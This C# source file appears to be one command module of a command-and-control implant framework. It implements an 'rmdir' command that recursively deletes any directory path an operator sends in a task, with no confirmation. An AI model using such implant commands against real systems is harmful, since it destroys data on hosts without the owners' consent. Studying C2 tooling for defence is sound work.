

using Agent.Models;
using System.IO;
using System;

namespace Agent.Commands
{
    public class DeleteDirectory : AgentCommand
    {
        public override string Name => "rmdir";

        public override string Execute(AgentTask task)
        {
            if (task.Arguements is null || task.Arguements.Length == 0)
            {
                return "No Path Provided";
            }

            var path = task.Arguements[0];

            Directory.Delete(path, true);

            if (!Directory.Exists(path))
            {
                return $"{path} deleted";
            }

            return $"Failed to Delete {path}";
        }
    }
}
